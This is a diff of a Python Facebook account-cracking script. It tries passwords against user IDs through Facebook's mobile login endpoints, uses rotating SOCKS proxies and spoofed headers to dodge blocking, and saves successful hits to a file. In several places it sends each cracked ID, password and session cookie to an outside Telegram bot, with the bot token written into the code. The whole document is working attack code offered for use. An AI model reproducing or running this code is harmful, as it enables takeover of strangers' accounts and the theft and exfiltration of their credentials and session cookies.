@@ -555,12 +555,12 @@ def crackfree(idf,pwv):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			p = ses.get("https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D223505336087945%26redirect_uri%3Dhttps%253A%252F%252Ftinyurl.com%252Fapp%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3D0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D038c5740-c5f6-43ca-9d01-4e6b5afe3fdd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftinyurl.com%2Fapp%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2%23_%3D_&display=page&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr")
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v3.3/dialog/oauth?client_id=223505336087945&redirect_uri=https%3A%2F%2Ftinyurl.com%2Fapp%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2&ret=login&fbapp_pres=0&logger_id=038c5740-c5f6-43ca-9d01-4e6b5afe3fdd&tp=unspecified&_rdr","flow":"login_no_pin","pass":pw,}
+			p = ses.get("https://m.facebook.com/?stype=lo&jlou=AfcuaXHCk9ZpFg-CbjxNg___k-GkovG8T0skbfYUYIb_oZfd_qOp8tP0ESVYZ_uldXCcfDqNGezFc1I3JP-HwQrmZ3dG0JTmQ2onZf8k57wO2Q&smuh=38850&lh=Ac_8RsKhgOp56_-szSc&_rdr")
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.facebook.katana","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D223505336087945%26redirect_uri%3Dhttps%253A%252F%252Ftinyurl.com%252Fapp%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3D0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D038c5740-c5f6-43ca-9d01-4e6b5afe3fdd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftinyurl.com%2Fapp%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2%23_%3D_&display=page&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": "https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}")
 				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
@@ -573,11 +573,11 @@ def crackfree(idf,pwv):
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
+				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
+				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
 				#tree.add(f"[bold green]{idf}|{pw}")
 				#tree.add(f"[bold green]{kuki}[/]")
@@ -585,7 +585,6 @@ def crackfree(idf,pwv):
 				#cetak(tree)
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 				break
-				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
